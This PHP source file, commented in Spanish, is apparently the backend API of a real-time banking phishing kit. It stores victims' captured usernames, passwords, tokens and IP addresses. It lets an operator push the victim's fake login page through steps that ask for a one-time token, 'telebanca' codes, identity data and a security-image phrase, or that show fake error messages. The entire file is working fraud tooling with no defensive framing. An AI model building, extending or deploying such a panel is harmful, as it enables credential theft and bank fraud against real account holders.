<?php
/**
 * API ops (login ↔ panel) para cPanel/LiteSpeed sin Node.
 * Rutas (vía .htaccess):
 *   GET|POST|DELETE  /api/ops/sessions
 *   GET|PATCH        /api/ops/sessions/{id}
 *   POST             /api/ops/sessions/{id}/action
 *
 * Importante: mutaciones usan LOCK_EX durante todo el read-modify-write
 * para que el heartbeat del login no pise acciones del panel (c-interna, etc).
 */

declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PATCH, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

$dataDir = __DIR__ . '/data';
$storeFile = $dataDir . '/sessions.json';

if (!is_dir($dataDir)) {
    mkdir($dataDir, 0755, true);
}
if (!file_exists($storeFile)) {
    file_put_contents($storeFile, '{}', LOCK_EX);
}

function json_out(mixed $data, int $code = 200): void
{
    http_response_code($code);
    echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

function read_body(): array
{
    $raw = file_get_contents('php://input');
    if ($raw === false || $raw === '') {
        return [];
    }
    $decoded = json_decode($raw, true);
    return is_array($decoded) ? $decoded : [];
}

/** Lectura con lock compartido (solo GET). */
function with_store_read(string $file, callable $fn): mixed
{
    $fh = fopen($file, 'c+');
    if ($fh === false) {
        json_out(['error' => 'no se pudo abrir store'], 500);
    }
    flock($fh, LOCK_SH);
    $raw = stream_get_contents($fh);
    $data = json_decode($raw ?: '{}', true);
    if (!is_array($data)) {
        $data = [];
    }
    try {
        return $fn($data);
    } finally {
        flock($fh, LOCK_UN);
        fclose($fh);
    }
}

/**
 * Mutación atómica: lock exclusivo → leer → callback → escribir → unlock.
 * Evita que un PATCH viejo del login borre un state nuevo del panel.
 */
function with_store_write(string $file, callable $fn): mixed
{
    $fh = fopen($file, 'c+');
    if ($fh === false) {
        json_out(['error' => 'no se pudo abrir store'], 500);
    }
    flock($fh, LOCK_EX);
    rewind($fh);
    $raw = stream_get_contents($fh);
    $data = json_decode($raw ?: '{}', true);
    if (!is_array($data)) {
        $data = [];
    }
    try {
        $result = $fn($data);
        ftruncate($fh, 0);
        rewind($fh);
        fwrite($fh, json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
        fflush($fh);
        return $result;
    } finally {
        flock($fh, LOCK_UN);
        fclose($fh);
    }
}

function list_sessions(array $sessions): array
{
    $list = array_values($sessions);
    usort($list, static function ($a, $b) {
        return ((int) ($a['createdAt'] ?? 0)) <=> ((int) ($b['createdAt'] ?? 0));
    });
    return $list;
}

/** Guarda data-URL en disco y devuelve URL pública liviana (evita JSON de MBs). */
function persist_image_data_url(string $sessionId, string $dataUrl): ?string
{
    if (!preg_match('#^data:image/(jpeg|jpg|png|webp|gif);base64,#i', $dataUrl, $m)) {
        // Ya es URL remota/local
        if (str_starts_with($dataUrl, '/api/ops/uploads/') || str_starts_with($dataUrl, 'http')) {
            return $dataUrl;
        }
        return null;
    }
    $ext = strtolower($m[1]);
    if ($ext === 'jpg') {
        $ext = 'jpeg';
    }
    $fileExt = $ext === 'jpeg' ? 'jpg' : $ext;
    $b64 = substr($dataUrl, strpos($dataUrl, ',') + 1);
    $bin = base64_decode($b64, true);
    if ($bin === false || strlen($bin) < 32) {
        return null;
    }
    // Límite ~1.5MB binario tras decode
    if (strlen($bin) > 1_500_000) {
        return null;
    }
    $dir = __DIR__ . '/uploads';
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    $safe = preg_replace('/[^a-zA-Z0-9_-]/', '', $sessionId) ?: ('img_' . time());
    $name = $safe . '.' . $fileExt;
    $path = $dir . '/' . $name;
    if (file_put_contents($path, $bin, LOCK_EX) === false) {
        return null;
    }
    return '/api/ops/uploads/' . $name;
}

function apply_action(array $existing, string $action, array $extra): array
{
    $state = $existing['state'] ?? 'waiting';
    if ($action === 'ask-token') {
        $state = 'token';
    } elseif ($action === 'ask-telebanca') {
        $state = 'telebanca';
    } elseif ($action === 'ask-identidad') {
        $state = 'identidad';
    } elseif ($action === 'send-imagen') {
        $state = 'imagen';
    } elseif ($action === 'waiting-imagen') {
        $state = 'waiting-imagen';
    } elseif ($action === 'waiting-pass') {
        $state = 'waiting-pass';
    } elseif ($action === 'c-interna') {
        $state = 'c-interna';
    } elseif ($action === 'error-token') {
        $state = 'error-token';
    } elseif ($action === 'error-user') {
        $state = 'error-user';
    } elseif ($action === 'error-pass') {
        $state = 'error-pass';
    } elseif ($action === 'error-tejuino') {
        $state = 'error-tejuino';
    } elseif ($action === 'error-identidad') {
        $state = 'error-identidad';
    } elseif ($action === 'done') {
        $state = 'done';
    }

    $isOperatorAction = !str_starts_with($action, 'waiting-');
    $now = (int) round(microtime(true) * 1000);
    $existing['state'] = $state;
    if ($isOperatorAction) {
        $existing['lastAction'] = $action;
        $existing['actionSeq'] = (($existing['actionSeq'] ?? 0) + 1);
    }
    if (array_key_exists('imageSrc', $extra) && $extra['imageSrc'] !== null && $extra['imageSrc'] !== '') {
        $raw = (string) $extra['imageSrc'];
        $sid = (string) ($existing['id'] ?? 'img');
        $stored = persist_image_data_url($sid, $raw);
        if ($stored !== null) {
            $existing['imageSrc'] = $stored;
        } elseif (!str_starts_with($raw, 'data:')) {
            $existing['imageSrc'] = $raw;
        }
        // Si era data-URL enorme e inválida, no la guardamos en JSON
    }
    if (array_key_exists('phrase', $extra) && $extra['phrase'] !== null && $extra['phrase'] !== '') {
        $existing['phrase'] = $extra['phrase'];
    }
    $existing['updatedAt'] = $now;
    $existing['last_seen'] = $now;
    return $existing;
}

$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
$id = isset($_GET['id']) ? (string) $_GET['id'] : '';
$isAction = isset($_GET['action']) && (string) $_GET['action'] === '1';

$path = parse_url($_SERVER['REQUEST_URI'] ?? '', PHP_URL_PATH) ?: '';
if ($id === '' && preg_match('#/api/ops/sessions/([^/]+)(?:/(action))?/?$#', $path, $m)) {
    $id = rawurldecode($m[1]);
    if (!empty($m[2])) {
        $isAction = true;
    }
}

// Colección: /api/ops/sessions
if ($id === '') {
    if ($method === 'GET') {
        $sessions = with_store_read($storeFile, static fn(array $s) => $s);
        json_out(['sessions' => list_sessions($sessions)]);
    }
    if ($method === 'POST') {
        $body = read_body();
        if (empty($body['id']) || empty($body['username'])) {
            json_out(['error' => 'id y username son requeridos'], 400);
        }
        $session = with_store_write($storeFile, static function (array &$sessions) use ($body) {
            $now = (int) round(microtime(true) * 1000);
            $sid = (string) $body['id'];
            $existing = $sessions[$sid] ?? null;
            $session = [
                'id' => $sid,
                'username' => (string) $body['username'],
                'password' => $body['password'] ?? ($existing['password'] ?? null),
                'token' => $body['token'] ?? ($existing['token'] ?? null),
                'device' => $body['device'] ?? ($existing['device'] ?? 'desktop'),
                'ip' => $body['ip'] ?? ($existing['ip'] ?? '127.0.0.1'),
                'state' => $body['state'] ?? ($existing['state'] ?? 'waiting'),
                'createdAt' => $body['createdAt'] ?? ($existing['createdAt'] ?? $now),
                'updatedAt' => $now,
                'last_seen' => $body['last_seen'] ?? $now,
                'imageSrc' => $body['imageSrc'] ?? ($existing['imageSrc'] ?? null),
                'phrase' => $body['phrase'] ?? ($existing['phrase'] ?? null),
            ];
            if ($existing) {
                // Si el body no trae state explícito de avance, conservar el del store
                // cuando el cliente solo refresca datos (defensa extra).
                $session = array_merge($existing, $session);
                $session['id'] = $sid;
                $session['updatedAt'] = $now;
                if (array_key_exists('state', $body)) {
                    $session['state'] = $body['state'];
                }
            }
            $sessions[$sid] = $session;
            return $session;
        });
        json_out(['session' => $session]);
    }
    if ($method === 'DELETE') {
        with_store_write($storeFile, static function (array &$sessions) {
            foreach (array_keys($sessions) as $key) {
                unset($sessions[$key]);
            }
            return true;
        });
        json_out(['ok' => true]);
    }
    json_out(['error' => 'method not allowed'], 405);
}

// Item: /api/ops/sessions/{id}
if (!$isAction) {
    if ($method === 'GET') {
        $session = with_store_read($storeFile, static function (array $sessions) use ($id) {
            return $sessions[$id] ?? null;
        });
        if (!$session) {
            json_out(['error' => 'not found'], 404);
        }
        json_out(['session' => $session]);
    }
    if ($method === 'PATCH') {
        $patch = read_body();
        $session = with_store_write($storeFile, static function (array &$sessions) use ($id, $patch) {
            if (!isset($sessions[$id])) {
                return null;
            }
            $now = (int) round(microtime(true) * 1000);
            $existing = $sessions[$id];
            // Solo aplicar claves presentes; no pisar state si el patch no lo manda.
            foreach ($patch as $key => $value) {
                if ($key === 'id') {
                    continue;
                }
                if ($value === null) {
                    continue;
                }
                $existing[$key] = $value;
            }
            $existing['id'] = $id;
            // Heartbeat (solo last_seen): no tocar updatedAt de negocio
            $onlyHeartbeat = array_keys($patch) === ['last_seen']
                || (count($patch) === 1 && isset($patch['last_seen']));
            if (!$onlyHeartbeat && array_key_exists('state', $patch)) {
                $existing['updatedAt'] = $now;
            } elseif (!$onlyHeartbeat) {
                $existing['updatedAt'] = $now;
            }
            if (isset($patch['last_seen'])) {
                $existing['last_seen'] = $patch['last_seen'];
            } else {
                $existing['last_seen'] = $now;
            }
            $sessions[$id] = $existing;
            return $existing;
        });
        if (!$session) {
            json_out(['error' => 'not found'], 404);
        }
        json_out(['session' => $session]);
    }
    json_out(['error' => 'method not allowed'], 405);
}

// Action: /api/ops/sessions/{id}/action
if ($method !== 'POST') {
    json_out(['error' => 'method not allowed'], 405);
}
$body = read_body();
$action = (string) ($body['action'] ?? '');
if ($action === '') {
    json_out(['error' => 'action requerida'], 400);
}
if ($action === 'send-imagen' && (empty($body['imageSrc']) || empty($body['phrase']))) {
    json_out(['error' => 'imageSrc y phrase requeridos'], 400);
}
$session = with_store_write($storeFile, static function (array &$sessions) use ($id, $action, $body) {
    if (!isset($sessions[$id])) {
        return null;
    }
    $sessions[$id] = apply_action($sessions[$id], $action, $body);
    return $sessions[$id];
});
if (!$session) {
    json_out(['error' => 'not found'], 404);
}
if ($action === 'send-imagen' && empty($session['imageSrc'])) {
    json_out(['error' => 'no se pudo guardar la imagen (tamaño o formato)'], 400);
}
json_out(['session' => $session]);
